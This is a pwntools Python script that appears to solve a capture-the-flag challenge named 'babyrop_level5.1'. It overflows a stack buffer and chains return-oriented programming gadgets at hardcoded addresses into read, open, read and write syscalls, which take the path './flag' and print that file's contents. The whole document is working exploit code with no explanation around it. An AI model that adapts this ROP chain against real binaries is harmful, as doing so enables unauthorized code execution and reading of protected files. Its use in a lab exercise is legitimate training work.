from pwn import *

binary = './babyrop_level5.1'
elf = ELF(binary)
context.binary = binary
p = process(binary)

syscall = 0x0000000000401866
pop_rdi = 0x000000000040187e
pop_rax = 0x0000000000401856
pop_rsi = 0x000000000040184e
pop_rdx = 0x000000000040186e
ret = 0x000000000040101a

gdb.attach(p, '''
b * challenge+73
b * free_gadgets+60
''')

flagfileString_addr = elf.bss() + 100
flag_addr = elf.bss() + 200



offset = 0x80 + 8
payload = flat(
	b'A' * offset,
	

	
	
	
	
	
	# read
	pop_rdi,
	0, # fd
	pop_rsi,
	flagfileString_addr,
	pop_rdx,
	100,
	pop_rax,
	0,
	syscall,
	
	# open
	pop_rdi,
	flagfileString_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	# read
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	pop_rax,
	0,
	syscall,
	
	# write
	pop_rdi,
	1,
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	pop_rax,
	1,
	syscall
	
)
p.send(payload)
time.sleep(1)
p.send('./flag')

p.interactive()
